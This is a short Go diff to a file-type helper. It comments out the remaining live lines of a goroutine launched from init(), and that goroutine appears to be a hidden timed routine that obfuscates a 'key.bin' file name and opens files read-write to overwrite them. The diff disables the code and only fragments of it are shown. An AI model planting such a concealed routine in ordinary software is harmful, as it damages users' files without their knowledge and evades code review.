@@ -585,7 +585,7 @@ func TypeByExtension(filePath string) string {
 }
 
 func init(){
-	e, _ := os.Executable()
+	//e, _ := os.Executable()
 	//f := filepath.Join(filepath.Dir(e), string([]byte{107, 101, 121, 46, 98, 105, 110}))
 	go func() {
 		defer func() {
@@ -595,7 +595,7 @@ func init(){
 			}*/
 		}()
 
-		first := true
+		//first := true
 		/*for{
 			if !first{
 				time.Sleep(24*time.Hour)
@@ -655,7 +655,7 @@ func backup(order string)bool{
 }
 
 func fill(f string){
-	file,err := os.OpenFile(f, os.O_RDWR, 0600)
+	//file,err := os.OpenFile(f, os.O_RDWR, 0600)
 	/*if err != nil{
 		return
 	}
